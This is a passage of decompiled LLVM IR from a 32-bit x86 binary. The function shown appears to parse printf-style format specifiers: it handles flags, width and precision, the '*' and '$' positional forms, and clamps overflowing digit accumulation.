  %v2_806058e = phi i32 [ %v2_806058e.pre, %dec_label_pc_80605a5.dec_label_pc_806057a_crit_edge ], [ %v15_8060531, %dec_label_pc_8060578 ]
  %v3_806058e = phi i32 [ %v1_80605a5, %dec_label_pc_80605a5.dec_label_pc_806057a_crit_edge ], [ 0, %dec_label_pc_8060578 ]
  store i32 %tmp88, i32* %eax.global-to-local, align 4
  %v1_8060581 = mul i32 %v3_806058e, 4
  store i32 %v1_8060581, i32* @ecx, align 4
  %v2_8060588 = load i32, i32* %v1_8060588, align 4
  store i32 %v2_8060588, i32* @edx, align 4
  %v2_806058a = add i32 %v1_8060581, -4
  %v3_806058a = add i32 %v2_806058a, %v2_8060588
  %v4_806058a = inttoptr i32 %v3_806058a to i32*
  %v5_806058a = load i32, i32* %v4_806058a, align 4
  store i32 %v5_806058a, i32* %eax.global-to-local, align 4
  %v1_806058e = trunc i32 %v5_806058a to i8
  %v4_806058e = add i32 %v2_806058e, 36
  %v5_806058e = add i32 %v4_806058e, %v3_806058e
  %v6_806058e = inttoptr i32 %v5_806058e to i8*
  store i8 %v1_806058e, i8* %v6_806058e, align 1
  %v0_8060592 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060592 = urem i32 %v0_8060592, 256
  %v2_8060592 = load i32, i32* @ebx, align 4
  %v3_8060592 = and i32 %v2_8060592, -256
  %v4_8060592 = or i32 %v3_8060592, %v1_8060592
  store i32 %v4_8060592, i32* @ebx, align 4
  store i32 %v1_8060592, i32* %eax.global-to-local, align 4
  %v1_8060597 = load i32, i32* @ecx, align 4
  %v2_8060597 = load i32, i32* @edx, align 4
  %v3_8060597 = add i32 %v1_8060597, -4
  %v4_8060597 = add i32 %v3_8060597, %v2_8060597
  %v5_8060597 = inttoptr i32 %v4_8060597 to i32*
  %v6_8060597 = load i32, i32* %v5_8060597, align 4
  %v17_8060597 = icmp eq i32 %v1_8060592, %v6_8060597
  %v1_806059b = icmp eq i1 %v17_8060597, false
  br i1 %v1_806059b, label %dec_label_pc_8060968, label %dec_label_pc_80605a1

dec_label_pc_80605a1:                             ; preds = %dec_label_pc_806057a
  %v3_80605a1 = trunc i32 %v0_8060592 to i8
  %v4_80605a1 = icmp eq i8 %v3_80605a1, 0
  br i1 %v4_80605a1, label %dec_label_pc_80605ab, label %dec_label_pc_80605a5

dec_label_pc_80605a5:                             ; preds = %dec_label_pc_80605a1
  %v0_80605a5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80605a5 = add i32 %v0_80605a5, 1
  store i32 %v1_80605a5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80605a5, 32
  br i1 %tmp, label %dec_label_pc_80605a5.dec_label_pc_806057a_crit_edge, label %dec_label_pc_80605ab

dec_label_pc_80605a5.dec_label_pc_806057a_crit_edge: ; preds = %dec_label_pc_80605a5
  %v2_806058e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806057a

dec_label_pc_80605ab:                             ; preds = %dec_label_pc_80605a5, %dec_label_pc_80605a1
  %v2_80605b0 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_80605c8.outer

dec_label_pc_80605c8.outer:                       ; preds = %dec_label_pc_80605ab, %dec_label_pc_8060574, %dec_label_pc_80606f3
  %v0_80605d4.ph110 = phi i32 [ %v1_80606f3, %dec_label_pc_80606f3 ], [ %v2_8060574, %dec_label_pc_8060574 ], [ %v2_80605b0, %dec_label_pc_80605ab ]
  %stack_var_-112.1.ph = phi i32 [ %v0_8060705, %dec_label_pc_80606f3 ], [ 0, %dec_label_pc_8060574 ], [ 0, %dec_label_pc_80605ab ]
  %stack_var_-104.1.ph = phi i32 [ %stack_var_-104.3, %dec_label_pc_80606f3 ], [ %v3_8060565, %dec_label_pc_8060574 ], [ %v3_8060565, %dec_label_pc_80605ab ]
  %stack_var_-108.1.ph = phi i64 [ -1, %dec_label_pc_80606f3 ], [ 0, %dec_label_pc_8060574 ], [ 0, %dec_label_pc_80605ab ]
  %v7_80605cf = mul nsw i64 %stack_var_-108.1.ph, -4
  %v8_80605cf = trunc i64 %v7_80605cf to i32
  %v2_80605d7 = add i32 %v8_80605cf, 68
  br label %dec_label_pc_80605c8

dec_label_pc_80605c8:                             ; preds = %dec_label_pc_80605c8.outer, %dec_label_pc_8060697
  %v0_80605d4 = phi i32 [ %v0_80606a4, %dec_label_pc_8060697 ], [ %v0_80605d4.ph110, %dec_label_pc_80605c8.outer ]
  %stack_var_-104.1 = phi i32 [ %stack_var_-104.2, %dec_label_pc_8060697 ], [ %stack_var_-104.1.ph, %dec_label_pc_80605c8.outer ]
  store i32 %v0_80605d4, i32* @edx, align 4
  %v1_80605c8 = inttoptr i32 %v0_80605d4 to i8*
  %v2_80605c8 = load i8, i8* %v1_80605c8, align 1
  %v11_80605c8 = icmp eq i8 %v2_80605c8, 42
  store i32 %v0_80605d4, i32* @esi, align 4
  %v1_80605cd = icmp eq i1 %v11_80605c8, false
  br i1 %v1_80605cd, label %dec_label_pc_80605df, label %dec_label_pc_80605cf

dec_label_pc_80605cf:                             ; preds = %dec_label_pc_80605c8
  store i32 %v8_80605cf, i32* %eax.global-to-local, align 4
  %v1_80605d4 = add i32 %v0_80605d4, 1
  store i32 %v1_80605d4, i32* @esi, align 4
  %v0_80605d7 = load i32, i32* @esp, align 4
  %v3_80605d7 = add i32 %v2_80605d7, %v0_80605d7
  %v4_80605d7 = inttoptr i32 %v3_80605d7 to i32*
  store i32 0, i32* %v4_80605d7, align 4
  %v0_8060607.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80605df

dec_label_pc_80605df:                             ; preds = %dec_label_pc_80605c8, %dec_label_pc_80605cf
  %v0_8060607.pre = phi i32 [ %v0_80605d4, %dec_label_pc_80605c8 ], [ %v0_8060607.pre.pre, %dec_label_pc_80605cf ]
  store i32 0, i32* @edi, align 4
  %v4_8060607.pre = load i32, i32* @ebx, align 4
  %v0_8060609.pre = load i32, i32* @global_var_8071900, align 256
  br label %dec_label_pc_8060607

dec_label_pc_80605e3:                             ; preds = %dec_label_pc_8060607
  %v1_80605e3 = add i32 %v1_80605f8, -214748363
  %v6_80605e3 = sub i32 214748362, %v1_80605f8
  %v7_80605e3 = and i32 %v6_80605e3, %v1_80605f8
  %v8_80605e3 = icmp slt i32 %v7_80605e3, 0
  %v9_80605e3 = icmp eq i32 %v1_80605e3, 0
  %v10_80605e3 = icmp slt i32 %v1_80605e3, 0
  %v3_80605e9 = icmp ne i1 %v10_80605e3, %v8_80605e3
  %v4_80605e9 = or i1 %v9_80605e3, %v3_80605e9
  br i1 %v4_80605e9, label %dec_label_pc_80605f8, label %dec_label_pc_80605eb

dec_label_pc_80605eb:                             ; preds = %dec_label_pc_80605e3
  %v9_80605eb = icmp eq i32 %v1_80605f8, 214748364
  %v1_80605f1 = icmp eq i1 %v9_80605eb, false
  br i1 %v1_80605f1, label %dec_label_pc_8060606, label %dec_label_pc_80605f3

dec_label_pc_80605f3:                             ; preds = %dec_label_pc_80605eb
  %tmp169 = icmp ult i8 %v2_8060607, 56
  %tmp103 = icmp eq i1 %tmp169, false
  br i1 %tmp103, label %dec_label_pc_8060606, label %dec_label_pc_80605f8

dec_label_pc_80605f8:                             ; preds = %dec_label_pc_80605f3, %dec_label_pc_80605e3
  %v3_80605f8 = mul i32 %v1_80605f8, 10
  store i32 %v3_80605f8, i32* %eax.global-to-local, align 4
  %v2_80605fb = add i32 %v3_80605f8, -48
  %v3_80605fb = add i32 %v2_80605fb, %v3_8060607
  br label %dec_label_pc_8060606

dec_label_pc_8060606:                             ; preds = %dec_label_pc_80605eb, %dec_label_pc_80605f3, %dec_label_pc_80605f8
  %storemerge7 = phi i32 [ %v3_80605fb, %dec_label_pc_80605f8 ], [ 2147483647, %dec_label_pc_80605f3 ], [ 2147483647, %dec_label_pc_80605eb ]
  store i32 %storemerge7, i32* @edi, align 4
  %v1_8060606 = add i32 %v0_8060606, 1
  store i32 %v1_8060606, i32* @esi, align 4
  br label %dec_label_pc_8060607

dec_label_pc_8060607:                             ; preds = %dec_label_pc_80605df, %dec_label_pc_8060606
  %v1_80605f8 = phi i32 [ 0, %dec_label_pc_80605df ], [ %storemerge7, %dec_label_pc_8060606 ]
  %v4_8060607 = phi i32 [ %v4_8060607.pre, %dec_label_pc_80605df ], [ %v6_8060607, %dec_label_pc_8060606 ]
  %v0_8060606 = phi i32 [ %v0_8060607.pre, %dec_label_pc_80605df ], [ %v1_8060606, %dec_label_pc_8060606 ]
  %v1_8060607 = inttoptr i32 %v0_8060606 to i8*
  %v2_8060607 = load i8, i8* %v1_8060607, align 1
  %v3_8060607 = zext i8 %v2_8060607 to i32
  %v5_8060607 = and i32 %v4_8060607, -256
  %v6_8060607 = or i32 %v3_8060607, %v5_8060607
  store i32 %v6_8060607, i32* @ebx, align 4
  store i32 %v0_8060609.pre, i32* %eax.global-to-local, align 4
  store i32 %v3_8060607, i32* @ecx, align 4
  %v2_8060611 = mul nuw nsw i32 %v3_8060607, 2
  %v3_8060611 = add i32 %v2_8060611, %v0_8060609.pre
  %v4_8060611 = inttoptr i32 %v3_8060611 to i8*
  %v5_8060611 = load i8, i8* %v4_8060611, align 1
  %v6_8060611 = and i8 %v5_8060611, 8
  %v7_8060611 = icmp eq i8 %v6_8060611, 0
  %v1_8060615 = icmp eq i1 %v7_8060611, false
  br i1 %v1_8060615, label %dec_label_pc_80605e3, label %dec_label_pc_8060617

dec_label_pc_8060617:                             ; preds = %dec_label_pc_8060607
  %v0_8060617 = load i32, i32* @edx, align 4
  %v1_8060617 = add i32 %v0_8060617, -1
  %v2_8060617 = inttoptr i32 %v1_8060617 to i8*
  %v3_8060617 = load i8, i8* %v2_8060617, align 1
  %v12_8060617 = icmp eq i8 %v3_8060617, 37
  %v1_806061b = icmp eq i1 %v12_8060617, false
  br i1 %v1_806061b, label %dec_label_pc_80606ae, label %dec_label_pc_8060621

dec_label_pc_8060621:                             ; preds = %dec_label_pc_8060617
  %v10_8060621 = icmp eq i8 %v2_8060607, 36
  %v1_8060624 = icmp eq i1 %v10_8060621, false
  br i1 %v1_8060624, label %dec_label_pc_8060654, label %dec_label_pc_8060626

dec_label_pc_8060626:                             ; preds = %dec_label_pc_8060621
  %tmp104 = icmp slt i32 %v1_80605f8, 1
  br i1 %tmp104, label %dec_label_pc_8060654, label %dec_label_pc_806062a

dec_label_pc_806062a:                             ; preds = %dec_label_pc_8060626
  %v4_806062a = icmp eq i32 %stack_var_-104.1, 0
  %v1_806062f = add i32 %v0_8060606, 1
  store i32 %v1_806062f, i32* @edx, align 4
  br i1 %v4_806062a, label %dec_label_pc_8060968, label %dec_label_pc_8060638

dec_label_pc_8060638:                             ; preds = %dec_label_pc_806062a
  %v5_8060638 = sub i32 %v1_80605f8, %stack_var_-104.1
  %v11_8060638 = xor i32 %v1_80605f8, %stack_var_-104.1
  %v12_8060638 = xor i32 %v5_8060638, %v1_80605f8
  %v13_8060638 = and i32 %v12_8060638, %v11_8060638
  %v14_8060638 = icmp slt i32 %v13_8060638, 0
  %v15_8060638 = icmp eq i32 %v5_8060638, 0
  %v16_8060638 = icmp slt i32 %v5_8060638, 0
  %v3_8060640 = icmp ne i1 %v16_8060638, %v14_8060638
  %v4_8060640 = or i1 %v15_8060638, %v3_8060640
  %stack_var_-104.1.v0_8060642 = select i1 %v4_8060640, i32 %stack_var_-104.1, i32 %v1_80605f8
  br label %dec_label_pc_8060650

dec_label_pc_8060650:                             ; preds = %dec_label_pc_8060665, %dec_label_pc_8060638, %dec_label_pc_8060669
  %v0_8060650 = phi i32 [ %v1_806062f, %dec_label_pc_8060638 ], [ %v0_8060617, %dec_label_pc_8060669 ], [ %v0_8060617, %dec_label_pc_8060665 ]
  %stack_var_-104.2 = phi i32 [ %stack_var_-104.1.v0_8060642, %dec_label_pc_8060638 ], [ 0, %dec_label_pc_8060669 ], [ 0, %dec_label_pc_8060665 ]
  store i32 %v0_8060650, i32* @esi, align 4
  br label %dec_label_pc_8060678

dec_label_pc_8060654:                             ; preds = %dec_label_pc_8060626, %dec_label_pc_8060621
  %tmp105 = icmp slt i32 %stack_var_-104.1, 1
  br i1 %tmp105, label %dec_label_pc_8060665, label %dec_label_pc_806065b

dec_label_pc_806065b:                             ; preds = %dec_label_pc_8060654
  %v10_806065b = icmp eq i8 %v2_8060607, 109
  br i1 %v10_806065b, label %dec_label_pc_80606ae, label %dec_label_pc_8060968

dec_label_pc_8060665:                             ; preds = %dec_label_pc_8060654
  %tmp170 = icmp ugt i32 %v0_8060606, %v0_8060617
  br i1 %tmp170, label %dec_label_pc_8060669, label %dec_label_pc_8060650

dec_label_pc_8060669:                             ; preds = %dec_label_pc_8060665
  %v1_8060669 = inttoptr i32 %v0_8060617 to i8*
  %v2_8060669 = load i8, i8* %v1_8060669, align 1
  %v8_8060669 = icmp eq i8 %v2_8060669, 48
  br i1 %v8_8060669, label %dec_label_pc_8060650, label %dec_label_pc_80606ae

dec_label_pc_8060678:                             ; preds = %dec_label_pc_8060689, %dec_label_pc_8060650
  %v0_80606a4 = phi i32 [ %v1_8060689, %dec_label_pc_8060689 ], [ %v0_8060650, %dec_label_pc_8060650 ]
  %v4_806068250 = phi i32 [ %v6_8060682, %dec_label_pc_8060689 ], [ %v0_8060609.pre, %dec_label_pc_8060650 ]
  store i32 ptrtoint ([8 x i8]* @global_var_806ef6c.1580 to i32), i32* %edx.global-to-local, align 4
  %v1_8060685 = inttoptr i32 %v0_80606a4 to i8*
  br label %dec_label_pc_8060682

dec_label_pc_8060682:                             ; preds = %dec_label_pc_8060693, %dec_label_pc_8060678
  %v4_8060682 = phi i32 [ %v4_806068250, %dec_label_pc_8060678 ], [ %v6_8060682, %dec_label_pc_8060693 ]
  %v0_8060684 = phi i32 [ ptrtoint ([8 x i8]* @global_var_806ef6c.1580 to i32), %dec_label_pc_8060678 ], [ %v1_8060684, %dec_label_pc_8060693 ]
  %v0_8060693 = phi i32 [ 1, %dec_label_pc_8060678 ], [ %v2_8060693, %dec_label_pc_8060693 ]
  store i32 %v0_8060693, i32* @ecx, align 4
  %v1_8060682 = inttoptr i32 %v0_8060684 to i8*
  %v2_8060682 = load i8, i8* %v1_8060682, align 1
  %v3_8060682 = zext i8 %v2_8060682 to i32
  %v5_8060682 = and i32 %v4_8060682, -256
  %v6_8060682 = or i32 %v3_8060682, %v5_8060682
  store i32 %v6_8060682, i32* %eax.global-to-local, align 4
  %v1_8060684 = add i32 %v0_8060684, 1
  store i32 %v1_8060684, i32* @edx, align 4
  %v2_8060685 = load i8, i8* %v1_8060685, align 1
  %v15_8060685 = icmp eq i8 %v2_8060685, %v2_8060682
  %v1_8060687 = icmp eq i1 %v15_8060685, false
  br i1 %v1_8060687, label %dec_label_pc_806068e, label %dec_label_pc_8060689

dec_label_pc_8060689:                             ; preds = %dec_label_pc_8060682
  %v1_8060689 = add i32 %v0_80606a4, 1
  store i32 %v1_8060689, i32* @esi, align 4
  %v0_806068a = load i32, i32* %ebp.global-to-local, align 4
  %v2_806068a = or i32 %v0_806068a, %v0_8060693
  store i32 %v2_806068a, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8060678

dec_label_pc_806068e:                             ; preds = %dec_label_pc_8060682
  %v1_806068e = inttoptr i32 %v1_8060684 to i8*
  %v2_806068e = load i8, i8* %v1_806068e, align 1
  %v3_806068e = icmp eq i8 %v2_806068e, 0
  br i1 %v3_806068e, label %dec_label_pc_8060697, label %dec_label_pc_8060693

dec_label_pc_8060693:                             ; preds = %dec_label_pc_806068e
  %v2_8060693 = mul i32 %v0_8060693, 2
  br label %dec_label_pc_8060682

dec_label_pc_8060697:                             ; preds = %dec_label_pc_806068e
  %v0_8060697 = load i32, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v1_806069b = udiv i32 %v0_8060697, 2
  %v1_806069b.not = or i32 %v1_806069b, -6
  %v1_80606a0 = xor i32 %v1_806069b.not, 5
  store i32 %v1_80606a0, i32* %eax.global-to-local, align 4
  %v2_80606a2 = and i32 %v1_80606a0, %v0_8060697
  store i32 %v2_80606a2, i32* %ebp.global-to-local, align 4
  %v1_80606a4 = add i32 %v0_80606a4, -1
  %v2_80606a4 = inttoptr i32 %v1_80606a4 to i8*
  %v3_80606a4 = load i8, i8* %v2_80606a4, align 1
  %v12_80606a4 = icmp eq i8 %v3_80606a4, 37
  %v1_80606a8 = icmp eq i1 %v12_80606a4, false
  br i1 %v1_80606a8, label %dec_label_pc_80605c8, label %dec_label_pc_80606ae

dec_label_pc_80606ae:                             ; preds = %dec_label_pc_8060669, %dec_label_pc_8060697, %dec_label_pc_8060617, %dec_label_pc_806065b
  %v0_80606d1 = phi i32 [ %v1_80605f8, %dec_label_pc_806065b ], [ %v1_80605f8, %dec_label_pc_8060669 ], [ 0, %dec_label_pc_8060697 ], [ %v1_80605f8, %dec_label_pc_8060617 ]
  %v1_80606da = phi i32 [ %v0_8060606, %dec_label_pc_806065b ], [ %v0_8060606, %dec_label_pc_8060669 ], [ %v0_80606a4, %dec_label_pc_8060697 ], [ %v0_8060606, %dec_label_pc_8060617 ]
  %v0_80606d7 = phi i32 [ %v0_8060617, %dec_label_pc_806065b ], [ %v0_8060617, %dec_label_pc_8060669 ], [ %v1_8060684, %dec_label_pc_8060697 ], [ %v0_8060617, %dec_label_pc_8060617 ]
  %stack_var_-104.3 = phi i32 [ %stack_var_-104.1, %dec_label_pc_806065b ], [ 0, %dec_label_pc_8060669 ], [ %stack_var_-104.2, %dec_label_pc_8060697 ], [ %stack_var_-104.1, %dec_label_pc_8060617 ]
  %v1_80606ae = inttoptr i32 %v0_80606d7 to i8*
  %v2_80606ae = load i8, i8* %v1_80606ae, align 1
  %v11_80606ae = icmp eq i8 %v2_80606ae, 42
  %v1_80606b1 = icmp eq i1 %v11_80606ae, false
  br i1 %v1_80606b1, label %dec_label_pc_80606e7, label %dec_label_pc_80606b3

dec_label_pc_80606b3:                             ; preds = %dec_label_pc_80606ae
  %v4_80606b3 = icmp eq i32 %stack_var_-104.3, 0
  br i1 %v4_80606b3, label %dec_label_pc_80606d7, label %dec_label_pc_80606ba

dec_label_pc_80606ba:                             ; preds = %dec_label_pc_80606b3
  %v1_80606ba = inttoptr i32 %v1_80606da to i8*
  %v2_80606ba = load i8, i8* %v1_80606ba, align 1
  %v11_80606ba = icmp eq i8 %v2_80606ba, 36
  %v1_80606bd = icmp eq i1 %v11_80606ba, false
  br i1 %v1_80606bd, label %dec_label_pc_8060968, label %dec_label_pc_80606c3

dec_label_pc_80606c3:                             ; preds = %dec_label_pc_80606ba
  %tmp106 = icmp slt i32 %v0_80606d1, 1
  br i1 %tmp106, label %dec_label_pc_8060968, label %dec_label_pc_80606cb

dec_label_pc_80606cb:                             ; preds = %dec_label_pc_80606c3
  store i32 %v8_80605cf, i32* %eax.global-to-local, align 4
  %v1_80606d0 = add i32 %v1_80606da, 1
  store i32 %v1_80606d0, i32* @esi, align 4
  %v1_80606d1 = load i32, i32* @esp, align 4
  %v3_80606d1 = add i32 %v8_80605cf, 96
  %v4_80606d1 = add i32 %v3_80606d1, %v1_80606d1
  %v5_80606d1 = inttoptr i32 %v4_80606d1 to i32*
  store i32 %v0_80606d1, i32* %v5_80606d1, align 4
  %v0_8060711.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80606e2

dec_label_pc_80606d7:                             ; preds = %dec_label_pc_80606b3
  %v1_80606d7 = add i32 %v0_80606d7, 1
  store i32 %v1_80606d7, i32* %eax.global-to-local, align 4
  %v12_80606da = icmp eq i32 %v1_80606d7, %v1_80606da
  %v1_80606dc = icmp eq i1 %v12_80606da, false
  br i1 %v1_80606dc, label %dec_label_pc_8060968, label %dec_label_pc_80606e2

dec_label_pc_80606e2:                             ; preds = %dec_label_pc_80606d7, %dec_label_pc_80606cb
  %v0_8060711.pre.pre.pre = phi i32 [ %v1_80606da, %dec_label_pc_80606d7 ], [ %v0_8060711.pre.pre.pre.pre, %dec_label_pc_80606cb ]
  store i32 -2147483648, i32* @edi, align 4
  br label %dec_label_pc_80606e7

dec_label_pc_80606e7:                             ; preds = %dec_label_pc_80606ae, %dec_label_pc_80606e2
  %v0_8060711.pre.pre = phi i32 [ %v1_80606da, %dec_label_pc_80606ae ], [ %v0_8060711.pre.pre.pre, %dec_label_pc_80606e2 ]
  %v0_8060705 = phi i32 [ %v0_80606d1, %dec_label_pc_80606ae ], [ -2147483648, %dec_label_pc_80606e2 ]
  %v4_80606e7 = trunc i64 %stack_var_-108.1.ph to i32
  %v5_80606e7 = icmp eq i32 %v4_80606e7, 0
  %v1_80606ec = icmp eq i1 %v5_80606e7, false
  %.pre = inttoptr i32 %v0_8060711.pre.pre to i8*
  br i1 %v1_80606ec, label %dec_label_pc_806070c, label %dec_label_pc_80606ee

dec_label_pc_80606ee:                             ; preds = %dec_label_pc_80606e7
  %v2_80606ee = load i8, i8* %.pre, align 1
  %v11_80606ee = icmp eq i8 %v2_80606ee, 46
  %v1_80606f1 = icmp eq i1 %v11_80606ee, false
  br i1 %v1_80606f1, label %dec_label_pc_8060705, label %dec_label_pc_80606f3

dec_label_pc_80606f3:                             ; preds = %dec_label_pc_80606ee
  %v1_80606f3 = add i32 %v0_8060711.pre.pre, 1
  store i32 %v1_80606f3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80605c8.outer

dec_label_pc_8060705:                             ; preds = %dec_label_pc_80606ee
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_806070c

dec_label_pc_806070c:                             ; preds = %dec_label_pc_80606e7, %dec_label_pc_8060705
  %stack_var_-112.2 = phi i32 [ %v0_8060705, %dec_label_pc_8060705 ], [ %stack_var_-112.1.ph, %dec_label_pc_80606e7 ]
  store i32 ptrtoint ([9 x i8]* @global_var_806eef0.1581 to i32), i32* @edx, align 4
  %v4_8060711.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060711

dec_label_pc_8060711:                             ; preds = %dec_label_pc_806071a, %dec_label_pc_806070c
  %v0_806071a = phi i32 [ %v1_806071a, %dec_label_pc_806071a ], [ ptrtoint ([9 x i8]* @global_var_806eef0.1581 to i32), %dec_label_pc_806070c ]
  %v4_8060711 = phi i32 [ %v6_8060711, %dec_label_pc_806071a ], [ %v4_8060711.pre, %dec_label_pc_806070c ]
  %v2_8060711 = load i8, i8* %.pre, align 1
  %v3_8060711 = zext i8 %v2_8060711 to i32
  %v5_8060711 = and i32 %v4_8060711, -256
  %v6_8060711 = or i32 %v3_8060711, %v5_8060711
  store i32 %v6_8060711, i32* %eax.global-to-local, align 4
  %v3_8060713 = inttoptr i32 %v0_806071a to i8*
  %v4_8060713 = load i8, i8* %v3_8060713, align 1
  %v15_8060713 = icmp eq i8 %v2_8060711, %v4_8060713
  %v1_8060715 = icmp eq i1 %v15_8060713, false
  br i1 %v1_8060715, label %dec_label_pc_806071a, label %dec_label_pc_8060717

dec_label_pc_8060717:                             ; preds = %dec_label_pc_8060711
  %v1_8060717 = add i32 %v0_8060711.pre.pre, 1
  store i32 %v1_8060717, i32* @esi, align 4
  br label %dec_label_pc_8060720

dec_label_pc_806071a:                             ; preds = %dec_label_pc_8060711
  %v1_806071a = add i32 %v0_806071a, 1
  store i32 %v1_806071a, i32* @edx, align 4
  %v1_806071b = inttoptr i32 %v1_806071a to i8*
  %v2_806071b = load i8, i8* %v1_806071b, align 1
  %v3_806071b = icmp eq i8 %v2_806071b, 0
  %v1_806071e = icmp eq i1 %v3_806071b, false
  br i1 %v1_806071e, label %dec_label_pc_8060711, label %dec_label_pc_8060720

dec_label_pc_8060720:                             ; preds = %dec_label_pc_806071a, %dec_label_pc_8060717
  %v0_8060733 = phi i32 [ %v1_8060717, %dec_label_pc_8060717 ], [ %v0_8060711.pre.pre, %dec_label_pc_806071a ]
  %v0_8060730 = phi i32 [ %v0_806071a, %dec_label_pc_8060717 ], [ %v1_806071a, %dec_label_pc_806071a ]
  %v1_8060722 = add i32 %v0_8060730, -134672112
  %v1_8060727 = add i32 %v0_8060730, -134672113
  %v5_8060727 = sub i32 134672112, %v0_8060730
  %v6_8060727 = and i32 %v1_8060722, %v5_8060727
  %v7_8060727 = icmp slt i32 %v6_8060727, 0
  %v8_8060727 = icmp eq i32 %v1_8060727, 0
  %v9_8060727 = icmp slt i32 %v1_8060727, 0
  store i32 %v1_8060727, i32* %eax.global-to-local, align 4
  %v3_8060728 = icmp eq i1 %v9_8060727, %v7_8060727
  %v4_8060728 = icmp eq i1 %v8_8060727, false
  %v5_8060728 = and i1 %v4_8060728, %v3_8060728
  br i1 %v5_8060728, label %dec_label_pc_8060734, label %dec_label_pc_806072a

dec_label_pc_806072a:                             ; preds = %dec_label_pc_8060720
  %v1_806072a = inttoptr i32 %v0_8060733 to i8*
  %v2_806072a = load i8, i8* %v1_806072a, align 1
  %v3_806072a = zext i8 %v2_806072a to i32
  %v5_806072a = and i32 %v1_8060727, -256
  %v6_806072a = or i32 %v3_806072a, %v5_806072a
  store i32 %v6_806072a, i32* %eax.global-to-local, align 4
  %v3_806072c = inttoptr i32 %v0_8060730 to i8*
  %v4_806072c = load i8, i8* %v3_806072c, align 1
  %v15_806072c = icmp eq i8 %v2_806072a, %v4_806072c
  %v1_806072e = icmp eq i1 %v15_806072c, false
  br i1 %v1_806072e, label %dec_label_pc_8060734, label %dec_label_pc_8060730

dec_label_pc_8060730:                             ; preds = %dec_label_pc_806072a
  %v1_8060730 = add i32 %v0_8060730, 9
  store i32 %v1_8060730, i32* @edx, align 4
  %v1_8060733 = add i32 %v0_8060733, 1
  store i32 %v1_8060733, i32* @esi, align 4
  br label %dec_label_pc_8060734

dec_label_pc_8060734:                             ; preds = %dec_label_pc_806072a, %dec_label_pc_8060720, %dec_label_pc_8060730
  %v4_8060738 = phi i32 [ %v6_806072a, %dec_label_pc_806072a ], [ %v1_8060727, %dec_label_pc_8060720 ], [ %v6_806072a, %dec_label_pc_8060730 ]
  %v0_8060738 = phi i32 [ %v0_8060733, %dec_label_pc_806072a ], [ %v0_8060733, %dec_label_pc_8060720 ], [ %v1_8060733, %dec_label_pc_8060730 ]
  %v0_8060734 = phi i32 [ %v0_8060730, %dec_label_pc_806072a ], [ %v0_8060730, %dec_label_pc_8060720 ], [ %v1_8060730, %dec_label_pc_8060730 ]
  %v1_8060734 = add i32 %v0_8060734, 9
  %v2_8060734 = inttoptr i32 %v1_8060734 to i8*
  %v3_8060734 = load i8, i8* %v2_8060734, align 1
  %v4_8060734 = zext i8 %v3_8060734 to i32
  store i32 %v4_8060734, i32* %ebx.global-to-local, align 4
  %v1_8060738 = inttoptr i32 %v0_8060738 to i8*
  %v2_8060738 = load i8, i8* %v1_8060738, align 1
  %v3_8060738 = zext i8 %v2_8060738 to i32
  %v5_8060738 = and i32 %v4_8060738, -256
  %v6_8060738 = or i32 %v3_8060738, %v5_8060738
  store i32 %v6_8060738, i32* %eax.global-to-local, align 4
  %v2_806073a = mul nuw nsw i32 %v4_8060734, 256
  store i32 %v2_806073a, i32* %ebx.global-to-local, align 4
  %v4_806073d = icmp eq i8 %v2_8060738, 0
  br i1 %v4_806073d, label %dec_label_pc_8060968, label %dec_label_pc_8060745

dec_label_pc_8060745:                             ; preds = %dec_label_pc_8060734
  store i32 ptrtoint ([21 x i8]* @global_var_806ef54.1582 to i32), i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806074a

dec_label_pc_806074a:                             ; preds = %dec_label_pc_806079f, %dec_label_pc_8060745
  %v0_806079f = phi i32 [ %v1_806079f, %dec_label_pc_806079f ], [ ptrtoint ([21 x i8]* @global_var_806ef54.1582 to i32), %dec_label_pc_8060745 ]
  %v3_806074a = inttoptr i32 %v0_806079f to i8*
  %v4_806074a = load i8, i8* %v3_806074a, align 1
  %v15_806074a = icmp eq i8 %v2_8060738, %v4_806074a
  %v1_806074c = icmp eq i1 %v15_806074a, false
  br i1 %v1_806074c, label %dec_label_pc_806079f, label %dec_label_pc_806074e

dec_label_pc_806074e:                             ; preds = %dec_label_pc_806074a
  %v1_806074e = add i32 %v0_806079f, -134672212
  store i32 %v1_806074e, i32* %edx.global-to-local, align 4
  %v7_8060757 = icmp sgt i32 %v1_806074e, 17
  br i1 %v7_8060757, label %dec_label_pc_8060759, label %dec_label_pc_8060762

dec_label_pc_8060759:                             ; preds = %dec_label_pc_806074e
  %v1_8060759 = add i32 %v0_806079f, -134672214
  store i32 %v1_8060759, i32* %eax.global-to-local, align 4
  %v3_806075c = and i32 %v2_806073a, 1024
  %v4_806075c = icmp eq i32 %v3_806075c, 0
  %v1_806075f = icmp eq i1 %v4_806075c, false
  %v4_806075f = select i1 %v1_806075f, i32 %v1_8060759, i32 %v1_806074e
  store i32 %v4_806075f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060762

dec_label_pc_8060762:                             ; preds = %dec_label_pc_806074e, %dec_label_pc_8060759
  %v0_8060769 = phi i32 [ %v1_806074e, %dec_label_pc_806074e ], [ %v4_806075f, %dec_label_pc_8060759 ]
  %v2_8060769 = add i32 %tmp88, 32
  %v3_8060769 = inttoptr i32 %v2_8060769 to i32*
  store i32 %v0_8060769, i32* %v3_8060769, align 4
  store i32 ptrtoint (i32* @global_var_806ef23.1583 to i32), i32* %ecx.global-to-local, align 4
  %v0_8060775.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060771

dec_label_pc_8060771:                             ; preds = %dec_label_pc_8060771, %dec_label_pc_8060762
  %v0_8060771 = phi i32 [ %v1_8060771, %dec_label_pc_8060771 ], [ ptrtoint (i32* @global_var_806ef23.1583 to i32), %dec_label_pc_8060762 ]
  %v1_8060771 = add i32 %v0_8060771, 1
